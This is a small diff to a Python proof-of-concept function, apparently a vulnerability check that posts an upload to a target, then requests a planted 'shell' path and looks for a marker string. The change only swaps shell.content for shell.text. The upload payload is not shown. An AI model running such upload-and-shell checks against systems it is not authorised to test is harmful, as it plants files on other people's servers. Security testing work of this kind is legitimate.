@@ -33,7 +33,7 @@ def poc(url):
     try:
         r = requests.post(url=upload_path, data=post_data, headers=header_data, timeout=3)
         shell = requests.get(shell_path)
-        if r.status_code is 200 and cipher in shell.content:
+        if r.status_code is 200 and cipher in shell.text:
             return True
 
     except Exception:
